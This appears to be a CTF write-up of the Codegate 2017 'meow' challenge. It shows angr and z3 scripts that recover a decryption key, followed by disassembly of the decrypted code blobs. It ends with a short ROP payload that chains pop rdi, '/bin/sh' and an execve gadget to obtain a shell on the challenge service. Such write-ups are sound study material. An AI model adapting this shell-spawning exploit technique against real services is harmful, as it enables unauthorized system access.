---
layout: post
title: Codegate 2017 quals - meow
category: writeup
---

Linux ELF binary and a service port is given. So I assume it's a pwnable task.

## 1. First look

This binary receives 10 byte input and checks its MD5 hash. If the check passes, the string is used to decrypt two data blobs. Then two decrypted blobs are `mmap`ed to fixed addresses 0x12000 and 0x14000 with RWE permission. Then at the end of the program, we can 'call' the code at 0x12000 just like a function.

Since finding preimage of the MD5 hash is hopeless, our goal is now finding the 10 byte key that makes the decoded blob plausible. To do that, we had to analyze the decryption function `0xD1D`. But I felt I will definitely make mistake during understanding it. So my teammate took another way.

## 2. Simplifying the decryption routine

The decryption seemed to be composed of simple XORs. So we used *angr* to derive the symbolic relation between input and output.

First load the binary in angr.

```py
import angr
proj = angr.Project('./meow')
```

<!--more-->

Then a warning message says

```text
WARNING | 2017-02-15 02:00:19,629 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
```

Yes it is a PIE binary. But thankfully angr loads it on a fixed location.

Since we don't want to deal with the MD5 check, I started the execution from the decryption function.

```py
state = proj.factory.entry_state(addr=0x400d1d)
```

Now we need to fill in the initial state values such as arguments and symbolic memory content.

```py
import claripy
state.regs.rdi = 0x100000
state.regs.rsi = 0x200000
state.regs.rdx = 182
for i in range(182):
    v = claripy.BVS('x{}'.format(i), 8)
    state.memory.store(state.regs.rdi + i, v)
for i in range(10):
    v = claripy.BVS('k{}'.format(i), 8)
    state.memory.store(state.regs.rsi + i, v)
```

Then execute until the end of function. The control flow is independent to any of the inputs. Thus there is only one path in the path group.

```py
path_group = proj.factory.path_group(state)
path_group.explore(find=0x4013c4)
s = path_group.found[0].state
```

If we inspect the state `s`, we can see that decryption result is represented as claripy AST. For example,

```
>>> s
<simuvex.s_state.SimState object at 0x7f717ac5dc30>
>>> s.memory.load(0x100000,1)
<BV8 __xor__(x181_181_8, k5_187_8, k2_184_8)>
```

Now we should parse the result.

```py
for i in range(182):
    r = repr(s.memory.load(0x100000 + i,1))
    matches = re.findall('((x|k)([0-9]+))_', r)
    terms = []
    for _, name, idx in matches:
        terms.append('%s[%s]' % (name, idx))
    line = 'y[%d] = ' % i
    line += ' ^ '.join(terms)
    print line
```

We have something like

```
y[0] = x[181] ^ k[5] ^ k[2]
y[1] = x[5] ^ k[2] ^ k[3]
y[2] = x[12] ^ k[1] ^ k[8]
y[3] = x[13] ^ k[3] ^ k[9]
```

We can re-do this process with the 56-byte blob.

## 3. Finding the correct key

The resulting data must be a complete function.

The first byte of it may be `push rbp` (`0x55`). Also the last byte may be `leave; ret` (`0xc9 0xc3`). Based on this hint, we can infer the original key. We have used z3 to solve the constraints.

In the data, we found some broken strings like "Did uou", "ch.ose". Fixed version of them were also added to constraints.

```py
import z3
import subprocess
import os
import struct

data1 = [
0xF1,0x64,0x72,0x4A,0x4F,0x48,0x4D,0xBA,0x77,0x73,0x1D,0x34,0xF5,0xAF,0xB8,0x0F,
0x24,0x56,0x11,0x65,0x47,0xA3,0x2F,0x73,0xA4,0x56,0x4F,0x70,0x4A,0x13,0x57,0x9C,
0x3F,0x6F,0x06,0x61,0x40,0x90,0xAF,0x39,0x10,0x29,0x34,0xC3,0x00,0x7A,0x40,0x3D,
0x4E,0x3F,0x0E,0x2A,0x2F,0x20,0x7F,0x73,0x89,0x7D,0x4B,0x1D,0x09,0xAA,0xD0,0x00,
0x21,0x89,0x4D,0x2A,0x67,0x7C,0x18,0x3B,0x39,0xF2,0x8D,0x1C,0xA7,0x71,0x57,0x2E,
0x31,0x14,0x67,0x48,0x3C,0x7D,0xAF,0x70,0xAE,0x10,0x31,0x68,0xD1,0x26,0x05,0xC8,
0x25,0xF2,0x62,0xF5,0x5D,0x38,0x34,0xF2,0x20,0x0E,0x7E,0x9F,0xFB,0x57,0x72,0x26,
0x57,0x67,0x15,0x10,0x15,0x13,0xB9,0x3E,0x79,0x89,0x5D,0x24,0x12,0x01,0x98,0x7B,
0x18,0x25,0xE0,0xDF,0x7C,0x24,0x1B,0x2D,0x44,0xB0,0x10,0x3D,0x57,0x3D,0x62,0xB4,
0x21,0x1D,0x3E,0xD1,0x10,0xD7,0x45,0x74,0x96,0x2B,0x6D,0x3B,0xED,0x10,0x00,0x67,
0x31,0xDF,0x6C,0xB8,0x86,0x1A,0x7C,0x6B,0x64,0x78,0xC6,0x37,0x76,0xE6,0x61,0xA0,
0xAD,0xBE,0x4C,0xBA,0xA7,0x0D
]

data2 = ''
data2 += struct.pack('<Q',0x2A4D48734AD94861)
data2 += struct.pack('<Q',0x6773AFF5A5187C07)
data2 += struct.pack('<Q',0xC7002ACCB8595624)
data2 += struct.pack('<Q',0x2439342338DF6F95)
data2 += struct.pack('<Q',0xEC833245186E4F5C)
data2 += struct.pack('<Q',0x6F14A0004A585BB5)
data2 += struct.pack('<Q',0xDA72C4CBEADBE24)
data2 = list(map(ord, data2))

key = [z3.BitVec('y%d' % i, 8) for i in range(10)]

def first(x, k):
    y = [0]*len(x)
    y[0] = x[181] ^ k[5] ^ k[2]
    y[1] = x[5] ^ k[2] ^ k[3]
    y[2] = x[12] ^ k[1] ^ k[8]
    y[3] = x[13] ^ k[3] ^ k[9]
    # ...
    y[181] = x[180] ^ k[3] ^ k[1]
    return y

def second(x, k):
    y = [0]*len(x)
    y[0] = x[55] ^ k[5] ^ k[2]
    y[1] = x[5] ^ k[2] ^ k[3]
    # ...
    y[54] = x[53] ^ k[1] ^ k[0]
    y[55] = x[54] ^ k[3] ^ k[1]
    return y

one = first(data1, key)
two = second(data2, key)

s = z3.Solver()
for i in range(10):
    s.add(key[i] >= 32)
    s.add(key[i] <= 127)

s.add(one[0] == 0x55) # push rbp
s.add(one[1] == 0x48)
s.add(one[2] == 0x89)
s.add(one[3] == 0xe5) # mov rbp, rsp
s.add(one[4] == 0x48)
s.add(one[5] == 0x83)
s.add(one[6] == 0xec) # sub rsp, 0xNN

def add_const(n, st):
    for i in range(n, n+len(st)):
        s.add(one[i] == ord(st[i-n]))
add_const(10, 'Did you')
add_const(24, 'choose')
add_const(0x60, 'ou pre')

print s.check()
m = s.model()

pw = ''
nums = []
for i in range(10):
    n = m[key[i]].as_long()
    pw += chr(n)
    nums.append(n)
print pw
print nums

subprocess.check_call(['./test'] + map(str, nums))
os.system('objdump -b binary -m i386:x86-64 -M intel -D bin')
os.system('objdump -b binary -m i386:x86-64 -M intel -D bin2')
```

The key was `$W337k!++y`.

## 4. Exploiting the decrypted code

If we enter the correct password, two data blobs are decrypted as follows:

```
0x12000:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 60             sub    rsp,0x60
   8:   48 b8 44 69 64 20 79    movabs rax,0x20756f7920646944
   f:   6f 75 20
  12:   48 89 45 a0             mov    QWORD PTR [rbp-0x60],rax
  16:   48 b8 63 68 6f 6f 73    movabs rax,0x612065736f6f6863
  1d:   65 20 61
  20:   48 89 45 a8             mov    QWORD PTR [rbp-0x58],rax
  24:   48 b8 20 63 61 74 3f    movabs rax,0x3f3f3f3f74616320
  2b:   3f 3f 3f
  2e:   48 89 45 b0             mov    QWORD PTR [rbp-0x50],rax
  32:   48 b8 3f 0a 57 68 61    movabs rax,0x7420746168570a3f
  39:   74 20 74
  3c:   48 89 45 b8             mov    QWORD PTR [rbp-0x48],rax
  40:   48 b8 79 70 65 20 6f    movabs rax,0x6320666f20657079
  47:   66 20 63
  4a:   48 89 45 c0             mov    QWORD PTR [rbp-0x40],rax
  4e:   48 b8 61 74 20 77 6f    movabs rax,0x646c756f77207461
  55:   75 6c 64
  58:   48 89 45 c8             mov    QWORD PTR [rbp-0x38],rax
  5c:   48 b8 20 79 6f 75 20    movabs rax,0x65727020756f7920
  63:   70 72 65
  66:   48 89 45 d0             mov    QWORD PTR [rbp-0x30],rax
  6a:   48 b8 66 65 72 3f 20    movabs rax,0x273027203f726566
  71:   27 30 27
  74:   48 89 45 d8             mov    QWORD PTR [rbp-0x28],rax
  78:   c7 45 e0 0a 3e 3e 3e    mov    DWORD PTR [rbp-0x20],0x3e3e3e0a
  7f:   c6 45 e4 00             mov    BYTE PTR [rbp-0x1c],0x0
  83:   48 8d 45 a0             lea    rax,[rbp-0x60]
  87:   ba 44 00 00 00          mov    edx,0x44
  8c:   48 89 c6                mov    rsi,rax
  8f:   bf 01 00 00 00          mov    edi,0x1
  94:   b8 01 00 00 00          mov    eax,0x1
  99:   0f 05                   syscall
  9b:   48 8d 45 08             lea    rax,[rbp+0x8]
  9f:   ba 18 00 00 00          mov    edx,0x18
  a4:   48 89 c6                mov    rsi,rax
  a7:   bf 00 00 00 00          mov    edi,0x0
  ac:   b8 00 00 00 00          mov    eax,0x0
  b1:   0f 05                   syscall
  b3:   90                      nop
  b4:   c9                      leave
  b5:   c3                      ret

0x14000:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 89 7d f8             mov    QWORD PTR [rbp-0x8],rdi
   c:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  10:   ba 00 00 00 00          mov    edx,0x0
  15:   be 00 00 00 00          mov    esi,0x0
  1a:   48 89 c7                mov    rdi,rax
  1d:   b8 3b 00 00 00          mov    eax,0x3b
  22:   0f 05                   syscall
  24:   90                      nop
  25:   c9                      leave
  26:   c3                      ret
  27:   00 00                   add    BYTE PTR [rax],al
  29:   2f                      (bad)
  2a:   62                      (bad)
  2b:   69 6e 2f 73 68 00 00    imul   ebp,DWORD PTR [rsi+0x2f],0x6873
  32:   00 00                   add    BYTE PTR [rax],al
  34:   00 00                   add    BYTE PTR [rax],al
  36:   5f                      pop    rdi
  37:   c3                      ret
```

There is a buffer overflow (\?) at the function 0x12000. Code blob 0x14000 contains execve() gadget, "/bin/sh" string and pop rdi gadget. The exploit is trivial.

```py
import struct
p = ''
p += struct.pack('<Q', 0x14036)
p += struct.pack('<Q', 0x14029)
p += struct.pack('<Q', 0x14000)
print '$W337k!++y'
print 3
print p
```

Send this payload to get a shell. Flag is `flag{what a lovely kitty!}`.

